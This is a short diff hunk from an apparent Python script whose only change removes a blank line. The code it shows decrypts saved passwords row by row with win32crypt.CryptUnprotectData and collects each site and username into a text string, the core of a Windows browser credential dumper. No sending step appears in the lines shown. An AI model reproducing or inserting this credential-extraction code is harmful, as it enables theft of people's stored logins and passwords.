@@ -13,7 +13,6 @@ txt_string = ''
 for result in cursor.fetchall():
 	# Decrypt the Password
 	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-
 	if password:
 		txt_string = txt_string + 'Site: ' + result[0] + '\n'
 		txt_string = txt_string + 'Username: ' + result[1] + '\n'
